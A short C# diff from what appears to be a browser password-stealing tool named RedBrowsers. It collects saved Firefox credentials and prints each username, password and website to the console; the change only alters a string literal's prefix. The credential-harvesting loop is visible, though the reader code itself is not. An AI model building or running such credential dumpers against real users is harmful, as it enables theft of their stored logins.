@@ -15,7 +15,7 @@ namespace RedBrowsers
              a.AddRange( Firfox.FirefoxPassReader.ReadPasswords());
             foreach (Account account in a ) 
             {
-                string output = $@"---------------------------------------------{Environment.NewLine}UserName    =  {account.UserName}{Environment.NewLine}PassWord    =  {account.Password}{Environment.NewLine}Website     =  {account.URL}{Environment.NewLine}Application =  {account.Application}{Environment.NewLine}---------------------------------------------";
+                string output = $"---------------------------------------------{Environment.NewLine}UserName    =  {account.UserName}{Environment.NewLine}PassWord    =  {account.Password}{Environment.NewLine}Website     =  {account.URL}{Environment.NewLine}Application =  {account.Application}{Environment.NewLine}---------------------------------------------";
                 Console.WriteLine(output);
             }
             Console.ReadLine();
